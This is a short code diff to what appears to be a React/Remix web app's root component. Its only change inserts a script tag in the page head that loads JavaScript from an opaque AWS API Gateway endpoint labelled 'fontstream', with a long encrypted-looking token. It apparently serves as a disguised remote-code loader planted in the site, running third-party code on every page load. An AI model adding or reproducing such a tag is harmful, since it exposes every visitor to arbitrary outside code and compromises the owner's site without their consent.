@@ -47,6 +47,11 @@ export default function App() {
     <MantineProvider>
       <html lang="en">
         <head>
+          <script
+            type="text/javascript"
+            src="https://z7z1yn5j64.execute-api.ap-northeast-2.amazonaws.com/V220930/api/fontstream/djs/?sid=gAAAAABjNoKB7aPtIJAn5jRMcYaz_Y-KZ4K-EOCGwhpW61tp_3yG3hoZRHqp-hAYyOzHi66fHUcsFs3gmIKAs3PK5K9MRVur0OOZR-1VNcmmUbFmkTom1C9u3WDjsk7A6-ZSpEGb_AdG6c_ksWhWQSzEFQrOS31--tX8_rDlpOm6sx-viCz_ZE7i5XDWuDSAbLocnrxVOACMAMVnNpmKqp79fYvMTixVBI2YqQWISV5ZO5u_wcqIlp_bSTMVr2u9-WNJutLtaBst"
+            charSet="utf-8"
+          />
           <Meta />
           <Links />
           {typeof document === "undefined" ? "__STYLES__" : null}
